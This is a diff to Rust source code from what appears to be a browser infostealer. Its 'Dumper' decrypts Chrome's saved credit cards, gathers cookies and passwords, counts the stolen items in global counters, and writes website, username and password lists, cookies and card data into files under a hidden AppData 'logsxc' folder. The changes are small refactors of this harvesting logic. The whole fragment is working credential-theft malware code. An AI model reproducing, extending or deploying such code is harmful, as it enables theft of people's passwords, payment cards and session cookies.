@@ -269,6 +269,7 @@ impl Dumper {
                 .filter(|acc| !acc.encrypted_number.is_empty())
                 .map(|acc| {
                     let res = DecryptedCreditCard::from_chrome_acc(acc.clone(), None);
+                 
                     if let Err(_) = res {
                         DecryptedCreditCard::from_chrome_acc(
                             acc.clone(),
@@ -285,12 +286,8 @@ impl Dumper {
             self.cookies.append(&mut cookies);
             self.creditcards.append(&mut credit_card);
 
-            unsafe {
-                crate::PASSWORDS += self.accounts.len() as i64;
-            }
-            unsafe {
-                crate::CREDIT_CARDS += self.creditcards.len() as i64;
-            }
+           
+           
         } else {
             let mut accounts = self
                 .query_accounts()?
@@ -316,12 +313,17 @@ impl Dumper {
             self.cookies.append(&mut cookies);
             self.creditcards.append(&mut cc);
 
-            unsafe {
-                crate::PASSWORDS += self.accounts.len() as i64;
-            }
-            unsafe {
-                crate::CREDIT_CARDS += self.creditcards.len() as i64;
-            }
+           
+        }
+
+
+
+        unsafe {
+
+            crate::PASSWORDS += self.accounts.len();
+            crate::CREDIT_CARDS += self.creditcards.len();
+
+
         }
         use std::io::Write;
 
@@ -333,7 +335,6 @@ impl Dumper {
             .map(|acc| format!("{}: {}:{}", acc.website, acc.username_value, acc.pwd))
             .collect::<Vec<_>>()
             .join("\n");
-        text.push_str("\n");
         text.push_str("\n");
         let mut text2 = String::from("");
         text2.push_str("\n");
@@ -384,7 +385,7 @@ impl Dumper {
                 .join("\n"),
         );
 
-        if text.as_bytes().len() > 0 {
+        if text.as_bytes().len() > 15 {
             std::fs::File::create(format!(
                 "{}\\logsxc\\passwords_{}.txt",
                 appdata, self.app_info.author
@@ -393,7 +394,7 @@ impl Dumper {
             .write(text.as_bytes())
             .unwrap();
         }
-        if text2.as_bytes().len() > 0 {
+        if text2.as_bytes().len() > 15 {
             std::fs::File::create(format!(
                 "{}\\logsxc\\cookies_{}.txt",
                 appdata, self.app_info.author
@@ -402,7 +403,7 @@ impl Dumper {
             .write_all(text2.as_bytes())
             .unwrap();
         }
-        if text3.as_bytes().len() > 0 {
+        if text3.as_bytes().len() > 15 {
             std::fs::File::create(format!(
                 "{}\\logsxc\\creditcards_{}.txt",
                 appdata, self.app_info.author
